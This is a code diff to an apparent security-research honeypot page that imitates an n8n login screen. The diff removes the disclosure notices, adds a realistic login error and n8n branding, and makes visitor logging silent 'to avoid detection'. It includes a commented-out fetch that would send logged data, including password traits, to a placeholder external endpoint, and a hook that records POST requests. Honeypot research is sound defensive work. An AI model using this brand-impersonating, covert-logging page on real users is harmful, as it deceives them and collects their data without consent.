@@ -101,27 +101,15 @@
             background: #e85d4a;
         }
 
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
+        .error-message {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
             padding: 12px;
             border-radius: 6px;
             margin-top: 20px;
-            font-size: 12px;
-            text-align: center;
-        }
-
-        .honeypot-notice {
-            background: #f8d7da;
-            border: 2px solid #dc3545;
-            color: #721c24;
-            padding: 15px;
-            border-radius: 6px;
-            margin-top: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            text-align: center;
+            font-size: 14px;
+            display: none;
         }
 
         .footer {
@@ -140,10 +128,6 @@
             <span class="version-tag">v1.65.0</span>
         </div>
 
-        <div class="warning">
-            ⚠️ This version contains known security vulnerabilities
-        </div>
-
         <form class="login-form" id="loginForm">
             <div class="form-group">
                 <label for="email">Email</label>
@@ -158,18 +142,17 @@
             <button type="submit">Sign In</button>
         </form>
 
-        <div class="honeypot-notice">
-            🍯 HONEYPOT NOTICE: This is a security research honeypot. All access is logged.
+        <div class="error-message" id="errorMessage">
+            Invalid email or password. Please try again.
         </div>
 
         <div class="footer">
-            Generated: 2026-01-07T22:54:55.966Z<br>
-            CVE-2026-21858 - CVSS 10
+            n8n.io &copy; 2026
         </div>
     </div>
 
     <script>
-        // Logging functionality
+        // Silent logging functionality
         function logEvent(eventType, data) {
             const logData = {
                 timestamp: new Date().toISOString(),
@@ -184,15 +167,13 @@
                 ...data
             };
 
-            // Log to console for now (in production, send to logging service)
-            console.log('[HONEYPOT LOG]', JSON.stringify(logData));
-
-            // Could send to GitHub Issues API, external logging service, etc.
-            // For GitHub Pages, we could use a third-party service like:
-            // - Cloudflare Workers
-            // - AWS Lambda
-            // - Google Analytics with custom events
-            // - FormSpree or similar webhook service
+            // Silent logging - no console output to avoid detection
+            // In production, send to logging service:
+            // fetch('https://your-logging-endpoint.workers.dev', {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify(logData)
+            // }).catch(() => {}); // Silently fail
 
             return logData;
         }
@@ -216,12 +197,18 @@
                 hasNumbers: /\d/.test(password)
             });
 
-            alert('🍯 Login attempt logged. This is a honeypot - all activity is monitored for security research.');
+            // Show realistic error message
+            document.getElementById('errorMessage').style.display = 'block';
+
+            // Reset form
+            setTimeout(function() {
+                document.getElementById('loginForm').reset();
+                document.getElementById('errorMessage').style.display = 'none';
+            }, 3000);
         });
 
-        // Log suspicious activities
+        // Log suspicious activities silently
         document.addEventListener('keydown', function(e) {
-            // Detect potential exploit attempts
             if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                 logEvent('devtools_opened', {});
             }
@@ -235,6 +222,18 @@
                 });
             }
         });
+
+        // Log any POST requests (potential exploit attempts)
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            if (args[1] && args[1].method === 'POST') {
+                logEvent('post_request', {
+                    url: args[0],
+                    hasBody: !!args[1].body
+                });
+            }
+            return originalFetch.apply(this, args);
+        };
     </script>
 </body>
 </html>
